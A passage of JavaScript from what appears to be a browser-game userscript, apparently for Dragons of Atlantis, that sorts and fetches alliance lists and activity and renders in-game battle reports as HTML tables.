			var sort_taa = event.data.sort_taa;
			switch ( sort_taa ) {
			case 0 :
				if (Data.options.alliance.sort_alliance == '0'){
					Data.options.alliance.sort_alliance = '-0';
				} else {
					Data.options.alliance.sort_alliance = '0';
				}
				break;
			case 1 :
				if (Data.options.alliance.sort_alliance == '1'){
					Data.options.alliance.sort_alliance = '-1';
				} else {
					Data.options.alliance.sort_alliance = '1';
				}
				break;
			case 2 :
				if (Data.options.alliance.sort_alliance == '2'){
					Data.options.alliance.sort_alliance = '-2';
				} else {
					Data.options.alliance.sort_alliance = '2';
				}
				break;
			case 3 :
				if (Data.options.alliance.sort_alliance == '3'){
					Data.options.alliance.sort_alliance = '-3';
				} else {
					Data.options.alliance.sort_alliance = '3';
				}
				break;
			case 4 :
				if (Data.options.alliance.sort_alliance == '4'){
					Data.options.alliance.sort_alliance = '-4';
				} else {
					Data.options.alliance.sort_alliance = '4';
				}
				break;
			}
			t.tabAlliances();
		}
		
		function sortAllianceList (){
			var t = Tabs.Alliance;

			switch ( Data.options.alliance.sort_alliance ) {
			case '0' :
				Data.dynamic.players.alliances.sort(function(a,b){return b.rank-a.rank});
				break;
			case '-0' :
				Data.dynamic.players.alliances.sort(function(a,b){return a.rank-b.rank});
				break;
			case '1' :
				Data.dynamic.players.alliances.sort(function(a, b){a = a.name.toLowerCase(); b = b.name.toLowerCase(); if (a>b) return -1; if (a <b) return 1; return 0;});
				break;
			case '-1' :
				Data.dynamic.players.alliances.sort(function(a, b){a = a.name.toLowerCase(); b = b.name.toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});
				break;
			case '2' :
				Data.dynamic.players.alliances.sort(function(a, b){a = a.overlord.name.toLowerCase(); b = b.overlord.name.toLowerCase(); if (a>b) return -1; if (a <b) return 1; return 0;});
				break;
			case '-2' :
				Data.dynamic.players.alliances.sort(function(a, b){a = a.overlord.name.toLowerCase(); b = b.overlord.name.toLowerCase(); if (a>b) return 1; if (a <b) return -1; return 0;});
				break;
			case '3' :
				Data.dynamic.players.alliances.sort(function(a,b){return b.member_count-a.member_count});
				break;
			case '-3' :
				Data.dynamic.players.alliances.sort(function(a,b){return a.member_count-b.member_count});
				break;
			case '4' :
				Data.dynamic.players.alliances.sort(function(a,b){return b.might-a.might});
				break;
			case '-4' :
				Data.dynamic.players.alliances.sort(function(a,b){return a.might-b.might});
				break;
			}
		}

		function refreshAlllianceList (){
			var t = Tabs.Alliance;
			if (t.checkAlliancesBusy) return false;
			t.checkAlliancesBusy = true;
			getAlliances(function(){
				Tabs.Alliance.checkAlliancesBusy = false
				var now = serverTime();
				Data.options.alliance.alliance_update = new Date(now * 1000).myString();
				refreshDisplay ();
			});
		}
		
		function refreshDisplay () {
			var t = Tabs.Alliance;
			if (t.checkAlliancesBusy) setTimeout (refreshDisplay,1000);
			else t.tabAlliances ();
		}
		
		function getAlliances (notify){
			var t = Tabs.Alliance;
			Data.dynamic.players.alliances_evolution = [];
			if (Data.dynamic.players.alliances && Data.dynamic.players.alliances != undefined && Data.dynamic.players.alliances.length > 0) 
			{
				Data.dynamic.players.alliances_evolution = Data.dynamic.players.alliances.cloneProps();
			}
			
			Data.dynamic.players.alliances = [];
			Data.dynamic.players.friends = [];
			Data.dynamic.players.foes = [];
			
			var dialogbox = dialogBox({
				id		 : setUID('dialog-getalliance'),
				minWidth : 300,
				centerTo : t.container,
				buttons  : [],
				overlay  : true,
				title	 : translate('Message'),
				html	 : '<center>' +  translate ('Search for alliance list') + '</center>'
			});
			
			getPageAlliances ({
				first : 1,
				last : 5,
				
				result : {alliances : [],friends : [],foes : []},
				
				onProgress : function (current,last) {
					dialogbox.html( '<center>' +  translate ('Search for alliance list') + '<br>'+ 'pages '+ current + '/'+ last + '</center>' );
				},
				
				onSuccess : function(r) {
					$J.merge( Data.dynamic.players.alliances, r.alliances );
					$J.merge( Data.dynamic.players.friends, r.friends );
					$J.merge( Data.dynamic.players.foes, r.foes );

					dialogbox.destroy();
					if (notify) notify(true);
				},

				onFailure : function( r ) {
					
					if ( r !== null && r.error ) {
						dialogbox.html( r.error );
					} else {
						dialogbox.html('<B>' + translate ('Error while retrieving the list of alliances') + '.</B>');
					}
					
					dialogbox.centerTo();
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
					if (notify) notify(false);
				},

			});

		}
		
		function getPageAlliances(options) {
			
			if (!options.first) options.first=1;
			if (!options.last) options.last=1;
			

			MyAjax.alliances ({
				
				page : options.first,
				
				onSuccess : function( r ) {
					
					if (options.onProgress) {
						options.onProgress(r.page,options.last);
					}
					
					var obj = r.cloneProps();
					//Didi : delete some properties
					for (var a=0; a<obj.alliances.length; a++) {
						delete obj.alliances[a].realm_id;
						delete obj.alliances[a].member_facebook_ids;
						delete obj.alliances[a].full;
						if (obj.alliances[a].overlord) {
							delete obj.alliances[a].overlord.alliance;
							delete obj.alliances[a].overlord.type;
							delete obj.alliances[a].overlord.race;
							delete obj.alliances[a].overlord.might;
							delete obj.alliances[a].overlord.id;
							delete obj.alliances[a].overlord.level;
						}
					}
					delete obj.done;
					delete obj.page;
					delete obj.total;
					
					if (options.result) {
						$J.merge( options.result.alliances, obj.alliances )
						$J.merge( options.result.friends, obj.friends )
						$J.merge( options.result.foes, obj.foes )
					}
					
					if (options.last > r.total) {
						options.last = r.total
					}
					
					if (options.first < options.last) {
						options.first++;
						getPageAlliances(options);
					} else {
						if (options.onSuccess) {
							options.onSuccess( options.result );
						}
					}
						
				},
					
				onFailure : function( r ) {
					
					if (options.onFailure) {
						options.onFailure( r );
					}
				},
				
				caller : 'Tabs.Alliance.getPageAlliances'
					
			});
		}
		
		function getAllianceRelationship (id, name){
			var found = false;
			var ret = name;
			if (Data.dynamic.players.friends) {
				for (var x=0; x<Data.dynamic.players.friends.length && !found; x++) {
					if (Data.dynamic.players.friends[x] == id) {
						found = true;
						ret = '<span class=' + UID['green'] + '>' + name + '</span>';
					}
				}
			}
			if (Data.dynamic.players.foes && !found) {
				for (var x=0; x<Data.dynamic.players.foes.length && !found; x++) {
					if (Data.dynamic.players.foes[x] == id) {
						found = true;
						ret = '<span class=' + UID['red'] + '>' + name + '</span>';
					}
				}
			}
			return ret;
		}

	},

	//** ALLIANCE ACTIVITY SUB-TAB ***
	tabActivity : function (){
		var t = Tabs.Alliance;

		if (!Data.options.alliance.sort_activity ||
			Data.options.alliance.sort_activity == null ||
			Data.options.alliance.sort_activity == undefined)
			Data.options.alliance.sort_activity = '0';
		if (Data.options.alliance.activity_update &&
			Data.options.alliance.activity_update != null &&
			Data.options.alliance.activity_update != undefined)
			kLastupdate = ' ('+Data.options.alliance.activity_update+')';
		else kLastupdate = '';

		var html = 
			 '<div id=' + setUID('Tabs.Alliance.tabActivity.Results') + ' style="height:640px">'
			+'	<div class=' + UID['title'] + '>' + translate('Activity') + ' ' + kLastupdate + '</div>'
			+'	<div id=' + setUID('Tabs.Alliance.tabActivity.ResultList') + ' style="height:620px; max-height:620px; overflow:auto; white-space:nowrap; margin-top:1px !important"></div>'
			+'	<div id=' + setUID('Tabs.Alliance.tabActivity.ReportDetail') + ' class=' + UID['status_ticker'] + ' style="height:555px; max-height:555px; overflow:auto; white-space:nowrap; display:none; margin-top:1px !important"></div>'
			+'	</div>';
			
		$J( '#'+UID['Tabs.Alliance.content'] )
		.css ( {
			'height'		: '670px',
			'margin-top'	: '5px',
			'overflow'      : 'hidden'
		})
		.html(html);

		var html = 
			 '<table class="' + UID['table'] + ' zebra">'
			+'	<tr>'
			+'		<td align=left colspan=6>'
			+'			<input type=button value="' + translate('Refresh') + '" id='+ setUID('Tabs.Alliance.tabActivity.RefreshActivity') +' />'
			+'		</td>'
			+'	</tr>'
			+'	<tr>'
			+'		<th width="40px" align=center><A><span>' + translate('ago') + '</span></A></th>'
			+'		<th width="150px" align=center><A><span>' + translate('Members') + '</span></A></th>'
			+'		<th width="20px" align=center><A><span>' + translate('Role') + '</span></A></th>'
			+'		<th width="150px" align=center><A><span>' + translate('Enemy') + '</span></A></th>'
			+'		<th width="60px" align=right><A><span>' + translate('Status') + '</span></A></th>'
			+'		<th width="60px" align=right><A><span>' + translate('Reports') + '</span></A></th>'
			+'	</tr>';
			
		if (t.report_num == -1) {
			$J( '#'+UID['Tabs.Alliance.tabActivity.ResultList'] )
			.css ( {
				'height'		: '620px',
				'overflow'      : 'auto'
			});
			$J( '#'+UID['Tabs.Alliance.tabActivity.ReportDetail'] ).css ( 'display', 'none');
			for (var i=0; i<Data.dynamic.players.activity.length; i++){
				var act = Data.dynamic.players.activity[i];
				var time =  timeFormatShort(parseInt(serverTime()) - parseInt(act.battle_time_i));
				var mate = '<span title="'+ (act.alliance_player ? act.alliance_player.name : null) +', '+ translate('might') +' '+ parseInt((act.alliance_player ? act.alliance_player.might:0)).intToCommas() +' ('+ (act.alliance_player? act.alliance_player.capital_x : null) +'/'+ (act.alliance_player ? act.alliance_player.capital_y : null) +')"><b>'+ (act.alliance_player ? act.alliance_player.name : null) +'</b></span>';
				var enemy_alli = '';
				if (act.non_alliance_player && act.non_alliance_player.alliance && act.non_alliance_player.alliance.name && act.non_alliance_player.alliance.name != '' && act.non_alliance_player.alliance.name != undefined) enemy_alli = ', '+act.non_alliance_player.alliance.name;
				var enemy = '<span title="'+ (act.non_alliance_player ? act.non_alliance_player.name: null) + enemy_alli +'\n'+ translate('might') +' '+ parseInt((act.non_alliance_player ? act.non_alliance_player.might:0)).intToCommas() +' ('+ (act.non_alliance_player ? act.non_alliance_player.capital_x :null)+'/'+ (act.non_alliance_player ? act.non_alliance_player.capital_y:null) +')">'+ ('<b>'+ (act.non_alliance_player ? act.non_alliance_player.name : null) +'</b>'+ enemy_alli).substring(0,35) +'</span>';
				html += 
				 '<tr>'
				+'	<td align=center>' + time + '</td>'
				+'	<td align=left>' + mate + '</td>'
				+'	<td align=center><b>' + (act.alliance_member_attacked ? '&gt' : '<span class=' + UID['red'] + '>&lt</span>') + '</b></td>'
				+'	<td align=left>' + enemy + '</td>'
				+'	<td align=left>' + (act.alliance_member_won ? translate('won') : '<span class=' + UID['red'] + '>' + translate ('lost') + '</span>') + '</td>'
				+'	<td>'
				+'		<input id='+ setUID('Tabs.Alliance.tabActivity.View_'+i) +' ref='+ i +' class="'+ UID['doa-icons'] + ' i-Show" type=image value="" />'
				+'	</td>'
				+'</tr>';
			}
		} else {
			$J( '#'+UID['Tabs.Alliance.tabActivity.ResultList'] )
			.css ( {
				'height'		: '60px',
				'overflow'      : 'hidden'
			})
			$J( '#'+UID['Tabs.Alliance.tabActivity.ReportDetail'] ).css ( 'display','');
			var act = Data.dynamic.players.activity[t.report_num];
			var time = timeFormatShort(parseInt(serverTime()) - parseInt(act.battle_time_i));
			var mate = '<span title="'+ (act.alliance_player ? act.alliance_player.name : null) +', '+ translate('might') +' '+ parseInt((act.alliance_player ? act.alliance_player.might:0)).intToCommas() +' ('+ (act.alliance_player? act.alliance_player.capital_x : null) +'/'+ (act.alliance_player ? act.alliance_player.capital_y : null) +')"><b>'+ (act.alliance_player ? act.alliance_player.name : null) +'</b></span>';
			var enemy_alli = '';
			if (act.non_alliance_player && act.non_alliance_player.alliance && act.non_alliance_player.alliance.name && act.non_alliance_player.alliance.name != '' && act.non_alliance_player.alliance.name != undefined) enemy_alli = ', '+act.non_alliance_player.alliance.name;
			var enemy = '<span title="'+ (act.non_alliance_player ? act.non_alliance_player.name: null) + enemy_alli +'\n'+ translate('might') +' '+ parseInt((act.non_alliance_player ? act.non_alliance_player.might:0)).intToCommas() +' ('+ (act.non_alliance_player ? act.non_alliance_player.capital_x :null)+'/'+ (act.non_alliance_player ? act.non_alliance_player.capital_y:null) +')">'+ ('<b>'+ (act.non_alliance_player ? act.non_alliance_player.name : null) +'</b>'+ enemy_alli).substring(0,35) +'</span>';
			html +=
			 '<tr>'
			+'	<td align=center>' + time + '</td>'
			+'	<td align=left>' + mate + '</td>'
			+'	<td align=center>' + (act.alliance_member_attacked ? '&gt' : '<span class=' + UID['red'] + '>&lt</span>') + '</td>'
			+'	<td align=left>' + enemy + '</td>'
			+'	<td align=left>' + (act.alliance_member_won ? translate('won') : '<span class=' + UID['red'] + '>' + translate ('lost') + '</span>') + '</td>'
			+'	<td>'
			+'		<input id='+ setUID('Tabs.Alliance.tabActivity.Hide') +' class="'+ UID['doa-icons'] + ' i-Hide" type=image value="" />'
			+'	</td>'
			+'</tr>';
		}
		html += 
			'</table>';
		
		$J( '#'+UID['Tabs.Alliance.tabActivity.ResultList'] ).html ( html );

		$J( '#'+UID['Tabs.Alliance.tabActivity.RefreshActivity'] ).click ( refreshActivityList );
		
		if (t.report_num == -1) {
			for (var i=0; i<Data.dynamic.players.activity.length; i++){
				$J( '#'+UID['Tabs.Alliance.tabActivity.View_'+ i] ).click ( onViewReport );
				$J( '#'+UID['Tabs.Alliance.tabActivity.View_'+ i] ).addClass ( UID['bnt_image_green'] );
			}
		} else {
			$J( '#'+UID['Tabs.Alliance.tabActivity.Hide'] ).click ( onHideReport );
			$J( '#'+UID['Tabs.Alliance.tabActivity.Hide'] ).addClass ( UID['bnt_image_green'] );
			showReport();
		}

		function onHideReport (event){
			t.report_num = -1;
			t.tabActivity ();
		}

		function onViewReport (event){
			var n = parseInt(event.target.getAttribute('ref'));
			t.report_num = n;
			t.tabActivity ();
		}

		function refreshActivityList (){
			var t = Tabs.Alliance;
			t.report_num = -1;
			if (t.checkAlliancesBusy) return false;
			t.checkAlliancesBusy = true;
			getActivities(function(){
				Tabs.Alliance.checkAlliancesBusy = false
				var now = serverTime();
				Data.options.alliance.activity_update = new Date(now * 1000).myString();
				refreshDisplay ();
			});
		}

		function refreshDisplay () {
			var t = Tabs.Alliance;
			if (t.checkAlliancesBusy) setTimeout (refreshDisplay,1000);
			else t.tabActivity ();
		}

		function getActivities (notify){
			var t = Tabs.Alliance;

			Data.dynamic.players.activity = [] ;
		
			var dialogbox = dialogBox({
				id		 : setUID('dialog-alliance-activity'),
				minWidth : 300,
				centerTo : t.container,
				buttons  : [],
				overlay  : true,
				title	 : translate('Message'),
				html	 : '<center>' +  translate ('Refresh alliance activity ...') + '</center>'
			});
	
			if ( !Seed.player.alliance || !Seed.player.alliance.id ) {
				dialogbox.html('<B>' + translate('Your aren\'t in alliance') + '.</B>');
			
				dialogbox.centerTo();
				dialogbox.buttons([
					{
						text: translate('Accept'),
						click: function() { 
							dialogbox.destroy();
						}
					}
				]);
				if (notify) notify(false);
				return ;
			}

			getPageActivities ({
				first : 1,
				last : 10,
				
				result : {battle : []},
				
				onProgress : function (current,last) {
					dialogbox.html( '<center>' +  translate ('Refresh alliance activity') + '<br>'+ 'pages '+ current + '/'+ last + '</center>' );
				},
				
				onSuccess : function(r) {
					$J.merge( Data.dynamic.players.activity, r.battle );

					Data.dynamic.players.activity.sort(function(a,b){return b.battle_time_i-a.battle_time_i});
					Data.options.alliance.sort_activity = '0';

					dialogbox.destroy();
					if (notify) notify(true);
				},

				onFailure : function( r ) {
					
					if ( r !== null && r.error ) {
						dialogbox.html( r.error );
					} else {
						dialogbox.html('<B>' + translate ('Error while retrieving the alliance activity') + '.</B>');
					}
					
					dialogbox.centerTo();
					dialogbox.buttons([
						{
							text: translate('Accept'),
							click: function() { 
								dialogbox.destroy();
							}
						}
					]);
					if (notify) notify(false);
				},

			});

		}

		function getPageActivities(options) {
			
			if (!options.first) options.first=1;
			if (!options.last) options.last=1;
			

			MyAjax.alliance_activity ({
				
				alliance_id : Seed.player.alliance.id,

				page : options.first,
				
				onSuccess : function( r ) {
					
					if (options.onProgress) {
						options.onProgress(options.first,options.last);
					}
					
					var obj = r.cloneProps();
					//Didi : delete some properties
					for (var a=0; a<obj.battle.length; a++) {
						if (obj.battle[a].alliance_player) {
							delete obj.battle[a].alliance_player.race;
							delete obj.battle[a].alliance_player.alliance;
							delete obj.battle[a].alliance_player.level;
						}
						if (obj.battle[a].non_alliance_player) {
							delete obj.battle[a].non_alliance_player.race;
							delete obj.battle[a].non_alliance_player.id;
							delete obj.battle[a].non_alliance_player.level;
							if (obj.battle[a].non_alliance_player.alliance) {
								delete obj.battle[a].non_alliance_player.alliance.role;
								delete obj.battle[a].non_alliance_player.alliance.id;
							}
						}
						delete obj.battle[a].battle_time;
					}
					delete obj.done;
					delete obj.page;
					delete obj.activity_total;
					
					if (options.result) {
						$J.merge( options.result.battle, obj.battle )
					}
					
					if ((options.last - 1) * 20 > r.activity_total) {
						options.last = ((r.activity_total % 20) == 0 ? parseInt((r.activity_total)/20) : parseInt((r.activity_total)/20)+1);
					}
					
					if (options.first < options.last) {
						options.first++;
						getPageActivities(options);
					} else {
						if (options.onSuccess) {
							options.onSuccess( options.result );
						}
					}
						
				},
					
				onFailure : function( r ) {
					
					if (options.onFailure) {
						options.onFailure( r );
					}
				},
				
				caller : 'Tabs.Alliance.getPageActivities'
					
			});
		}

		function showReport (){
			var t = Tabs.Alliance;
			if ((!t.last_report || t.last_report == null || t.last_report == undefined || 
				(t.last_report.report_notification.id != Data.dynamic.players.activity[t.report_num].battle_report_id)) &&
				!t.checkActivityBusy) {
				t.checkActivityBusy = true;
				var dialogbox = dialogBox({
					id		 : setUID('dialog-alliance-report'),
					minWidth : 300,
					centerTo : t.container,
					buttons  : [],
					overlay  : true,
					title	 : translate('Message'),
					html	 : '<center>' +  translate ('Reading report ...') + '</center>'
				});

				MyAjax.alliancereportsRead ({
					member_id : Data.dynamic.players.activity[t.report_num].alliance_player.id,
					report_id : Data.dynamic.players.activity[t.report_num].battle_report_id,
					
					onSuccess : function( r ) {
						t.last_report = r.cloneProps();
						dialogbox.destroy();

						t.checkActivityBusy = false;
						displayReport ();
					},
						
					onFailure : function( r ) {
						
						if ( r !== null && r.error ) {
							dialogbox.html( r.error );
						} else {
							dialogbox.html('<B>' + translate ('Error while retrieving the report') + '.</B>');
						}
						
						dialogbox.centerTo();
						dialogbox.buttons([
							{
								text: translate('Accept'),
								click: function() { 
									dialogbox.destroy();
								}
							}
						]);
						t.checkActivityBusy = false;
					},
					
					caller : 'Tabs.Alliance.showReport'
						
				});
			} else {
				displayReport ();
			}
		}

		function displayReport (){
			var t = Tabs.Alliance;
			var notif = t.last_report.report_notification;
			var rep = t.last_report.report;
			var att = rep.attacker;
			var def = rep.defender;
			// Battle report header section
			var main_result = '';
			var sub_result = '';
			var is_defender = false;
			if (att.name == Data.dynamic.players.activity[t.report_num].aname) {
				if (rep.winner == 'attacker') {
					main_result = 'victory';
					switch (rep.location.terrain) {
						case 'City'		: sub_result = 'attack-city-win'; break;
						case 'Outpost'	: sub_result = 'attack-outpost-win'; break;
						default			: sub_result = 'attack-wild-win'; break;
					}
				} else {
					main_result = 'defeat';
					switch (rep.location.terrain) {
						case 'City'		: sub_result = 'attack-city-lose'; break;
						case 'Outpost'	: sub_result = 'attack-outpost-lose'; break;
						default			: sub_result = 'attack-wild-lose'; break;
					}
				}
			} else {
				is_defender = true;
				if (rep.winner == 'defender') {
					main_result = 'victory';
					switch (rep.location.terrain) {
						case 'City'		: sub_result = 'defend-city-win'; break;
						case 'Outpost'	: sub_result = 'defend-outpost-win'; break;
						default			: sub_result = 'defend-wild-win'; break;
					}
				} else {
					main_result = 'defeat';
					switch (rep.location.terrain) {
						case 'City'		: sub_result = 'defend-city-lose'; break;
						case 'Outpost'	: sub_result = 'defend-outpost-lose'; break;
						default			: sub_result = 'defend-wild-lose'; break;
					}
				}
			}
			var html = 
				 '<table style="margin-top:3px" width=100%>'
				+'	<tr valign=top align=center>'
				+'		<td width=100%><br><b><span class=' + UID['red'] + '><b>' + translate(main_result).toUpperCase() + '</b></span></b> - <b>' + translate(sub_result) + '</b></td>'
				+'	</tr>'
				+'</table>'
				+'<br>'
				+'<table style="margin-top:3px" width=100%>'
				+'	<tr valign=top align=left>'
				+'		<td width=49%>'
				+'			<label>' + translate('report-no') + ' :</label><b>' + notif.id + '</b>'
				+'			<br>'
				+'			<label>' + new Date(notif.created_at * 1000).myString() + '</label>'
				+'			<br><br>'
				+'			<label>' + translate(rep.location.terrain) + ' ' + translate('level') + ' ' + rep.location.level + '</label>'
				+'			<br>';
				
			var location = (rep.location.terrain == 'Outpost' ? translate(rep.location.title) : (rep.location.terrain == 'City' ? rep.location.title : ''));
			if (location != '') {
				html += 
					 '		<table width=100%>'
					+'			<tr>'
					+'				<td width=5%><label>' + translate('location') + ' : </td>'
					+'				<td width=95%><b>' + location + '</b></td>'
					+'			</tr>'
					+'			<tr>'
					+'				<td></td>'
					+'				<td><label><b>' + rep.location.x + ', ' + rep.location.y + '</b></label></td>'
					+'			</tr>'
					+'		</table>'
					+'		<br>';
			} else {
				html += 
					 '		<label>' + translate('location') + ' : <b>' + rep.location.x + ', ' + rep.location.y + '</b></label>'
					+'		<br>';
			}

			if (def.great_dragon) {
				var dmg = def.great_dragon.starting_life - def.great_dragon.ending_life;
				var life = ((dmg / def.great_dragon.starting_life) * 100).toFixed(2);
				html += 
					 '		<table width=100%>'
					+'			<tr>'
					+'				<td width=20%>' + translate('GreatDragon') + ' ' + def.great_dragon.level + ' : </td>'
					+'				<td width=80%><b>' + parseInt(dmg).intToCommas() + '</b>' + translate(' damages taken') + '</td>'
					+'			</tr>'
					+'			<tr>'
					+'				<td></td>'
					+'				<td><b>' + life + '%</b> ' + translate('life lost') + '</td>'
					+'			</tr>'
					+'		</table>'
					+'		<br>';
			}
			html += 
				 '		</td>'
				+'		<td width=2%>&nbsp</td>'
				+'		<td width=49%>'
				+'			<table class=' + UID['table'] + ' width=100%>'
				+'				<tr>'
				+'					<th colspan=2 class=left>'+ translate('Resources') +'</th>'
				+'				</tr>';
				
			var res = rep.spoils.resources;
			for (var r=0; r<t.transportable_resource_types.length; r++) {
				var desc = t.transportable_resource_types[r];
				//if (desc == 'blue_energy') desc = 'blueenergy250k';
				var found = false;
				if (res) {
					for (var p in res) {
						if (p == t.transportable_resource_types[r]) {
							var res_value = (parseInt(res[p]) > 0 ? '<b>'+ parseInt(is_defender ? parseInt(res[p])*-1 : parseInt(res[p])).intToCommas() +'</b>' : 0);
							html += 
							 '	<tr>'
							+'		<td class=left width=50%>'
							+'			<span class="' + UID['doa-icons'] + ' i-' + desc + '" ></span>'
							+ 			translate(desc.replace(/_/,' ')) 
							+'		</td>'
							+'		<td align=right width=50%>'+ res_value +'</td>'
							+'	</tr>';
							found = true;
						}
					}
				}
				if (!found)
					html += 
					 '			<tr>'
					+'				<td class=left width=50%>'
					+'					<span class="' + UID['doa-icons'] + ' i-' + desc + '" ></span>'
					+ 					translate(desc.replace(/_/,' ')) 
					+'				</td>'
					+'				<td align=right width=50%>0</td>'
					+'			</tr>';
			}
			var kitm = rep.spoils.kill_items;
			if (kitm) {
				for (var p in kitm)
					html += 
					 '			<tr>'
					+'				<td class=left width=50%>'
					+'					<span class="' + UID['doa-icons'] + ' i-' + p + '" ></span>'
					+ 					translate(p) 
					+'				</td>'
					+'				<td align=right width=50%>'+ parseInt(kitm[p]).intToCommas() + '</td>'
					+'			</tr>';
			}
			var itm = rep.spoils.items;
			if (itm && itm.length>0) {
				for (var o=0; o<itm.length; o++)
					html += 
						 '		<tr>'
						+'			<td class=left colspan=2>'+ translate(itm[o]) +'</td>'
						+'		</tr>';
			} else {
				html += 
					 '			<tr>'
					+'				<td class=left colspan=2>'+ translate('battle-report-no-items') +'</td>'
					+'			</tr>';
			}
			html += 
				 '			</table>'
				+'		</td>'
				+'	</tr>'
				+'</table>'
				+'<br><br>';

			// Battle report troops section
			if (att.location) att_loc = att.location.x + ', ' + att.location.y;
			else att_loc = rep.location.x + ', ' + rep.location.y;
			if (def.location) def_loc = def.location.x + ', ' + def.location.y;
			else def_loc = rep.location.x + ', ' + rep.location.y;
			html += 
				 '<table style="margin-top:3px" width=100%>'
				+'	<tr valign=top align=center>'
				+'		<td width=49%>'
				+'			<table class=' + UID['table'] + ' width=100%>'
				+'				<tr>'
				+'					<td valign=middle colspan=3><b>'+ att.name +'</b> ('+ att_loc +')'
				+'					&nbsp<span class=' + UID['red'] + '>'+ ((rep.winner == 'attacker') ? translate ('victorious') : translate ('defeated'))+'</span>'
				+'					</td>'
				+'				</tr>'
				+'				<tr>'
				+'					<th valign=middle width=60%><b>'+ translate('Troops') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('Fought') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('lost') +'</b></th>'
				+'				</tr>';
			if (att.units) {
				for (var p in att.units) {
					if (p && att.units[p]) {
						var lost_troops = (att.units[p][0] != att.units[p][1] ? '<span class=' + UID['red'] + '><b>'+ parseInt(att.units[p][0] - att.units[p][1]).intToCommas() +'</b></span>' : 0);
						html += 
							 '	<tr>'
							+'		<td class=left>'
							+'			<span class="' + UID['doa-icons'] + ' i-' + p + '" ></span>'
							+ 			translate(p) 
							+'		</td>'
							+'		<td align=right>'+ parseInt(att.units[p][0]).intToCommas() +'</td>'
							+'		<td align=right>'+ lost_troops +'</td>'
							+'	</tr>';
					}
				}
			}
			html += 
				 '			</table>'
				+'		</td>'
				+'		<td width=2%>&nbsp</td>'
				+'		<td width=49%>'
				+'			<table class=' + UID['table'] + ' width=100%>'
				+'				<tr>'
				+'					<td valign=middle colspan=3><b>'+ def.name +'</b> ('+ def_loc +')'
				+'					&nbsp<span class=' + UID['red'] + '>'+ ((rep.winner != 'attacker') ? translate ('victorious') : translate ('defeated'))+'</span>'
				+'					</td>'
				+'				</tr>'
				+'				<tr>'
				+'					<th valign=middle width=60%><b>'+ translate('Troops') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('Fought') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('lost') +'</b></th>'
				+'				</tr>';
			if (def.units) {
				for (var p in def.units) {
					if (p && def.units[p]) {
						var lost_troops = (def.units[p][0] != def.units[p][1] ? '<span class=' + UID['red'] + '><b>'+ parseInt(def.units[p][0] - def.units[p][1]).intToCommas() +'</b></span>' : 0);
						html += 
							 '	<tr>'
							+'		<td class=left>'
							+'			<span class="' + UID['doa-icons'] + ' i-' + p + '" ></span>'
							+ 			translate(p) 
							+'		</td>'
							+'		<td align=right>'+ parseInt(def.units[p][0]).intToCommas() +'</td>'
							+'		<td align=right>'+ lost_troops +'</td>'
							+'	</tr>';
					}
				}
			}
			html += 
				 '			</table>'
				+'		</td>'
				+'	</tr>'
				+'</table>'
				+'<br><br>';
				
			if ((att.items && att.items.length>0) || (def.items && def.items.length>0)) {
				html += 
					 '<table style="margin-top:3px" width=100%>'
					+'	<tr valign=top align=center>'
					+'		<td width=49%>'
					+'			<table class=' + UID['table'] + ' width=100%>';
				if (att.items && att.items.length>0) {
					html += 
						 '			<tr>'
						+'				<th colspan=3 class=left>'+ translate('boost-combat') +'</th>'
						+'			</tr>';
					for (var o=0; o<att.items.length; o++)
						html += 
							 '		<tr>'
							+'			<td align=left colspan=3>'
							+'				<span class="' + UID['doa-icons'] + ' i-' + att.items[o] + '" ></span>'
							+ 				translate(att.items[o]) 
							+'			</td>'
							+'		</tr>';
				}
				html += 
					 '			</table>'
					+'		</td>'
					+'		<td width=2%>&nbsp</td>'
					+'		<td width=49%>'
					+'			<table class=' + UID['table'] + ' width=100%>';
				if (def.items && def.items.length>0) {
					html += 
						 '			<tr>'
						+'				<th colspan=3 class=left>'+ translate('boost-combat') +'</th>'
						+'			</tr>';
					for (var o=0; o<def.items.length; o++)
						html += 
							 '			<tr>'
							+'				<td align=left colspan=3>'
							+'					<span class="' + UID['doa-icons'] + ' i-' + def.items[o] + '" ></span>'
							+ 					translate(def.items[o]) 
							+'				</td>'
							+'			</tr>';
				}
				html += 
					 '			</table>'
					+'		</td>'
					+'	</tr>'
					+'</table>'
					+'<br><br>';
			}

			// Battle report souls section
			html += 
				 '<table style="margin-top:3px" width=100%>'
				+'	<tr valign=top align=center>'
				+'		<td width=49%>'
				+'			<table class=' + UID['table'] + ' width=100%>'
				+'				<tr>'
				+'					<th valign=middle width=70%><b>'+ translate('Troops') +'</b></th>'
				+'					<th valign=middle width=30%><b>'+ translate('Souls') +'</b></th>'
				+'				</tr>';
			if (att.souls) {
				var mausoleumsFull = false;
				if (att.souls.soul_capacity == true) {
					mausoleumsFull = true;
					delete att.souls.soul_capacity;
				}
				for (var p in att.souls) {
					if (p && !isNaN(att.souls[p]) && att.souls[p] > 0) {
						html += 
							 '	<tr>'
							+'		<td class=left>'
							+'			<span class="' + UID['doa-icons'] + ' i-' + p + '" ></span>'
							+ 			translate(p) 
							+'		</td>'
							+'		<td align=right>'+ parseInt(att.souls[p]).intToCommas() +'</td>'
							+'	</tr>';
					}
				}
				if (mausoleumsFull) {
					html += 
						 '	<tr>'
						+'		<td class=left colspan=2>'
						+ 			translate('mausoleums-full') 
						+'		</td>'
						+'	</tr>';
				}
			}
			html += 
				 '			</table>'
				+'		</td>'
				+'		<td width=2%>&nbsp</td>'
				+'		<td width=49%>'
				+'			<table class=' + UID['table'] + ' width=100%>'
				+'				<tr>'
				+'					<th valign=middle width=60%><b>'+ translate('Troops') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('Souls') +'</b></th>'
				+'					<th valign=middle width=20%><b>'+ translate('Reaped') +'</b></th>'
				+'				</tr>';
			if (def.souls) {
				var mausoleumsFull = false;
				if (def.souls.soul_capacity == true) {
					mausoleumsFull = true;
					delete def.souls.soul_capacity;
				}
				for (var p in def.souls) {
					if (p && !isNaN(def.souls[p]) && def.souls[p] > 0) {
						var souls = def.souls[p];
						var reaped = 0;
						if (def.souls.reaped_souls && def.souls.reaped_souls[p] && !isNaN(def.souls.reaped_souls[p]) && def.souls.reaped_souls[p] > 0) {
							reaped = def.souls.reaped_souls[p];
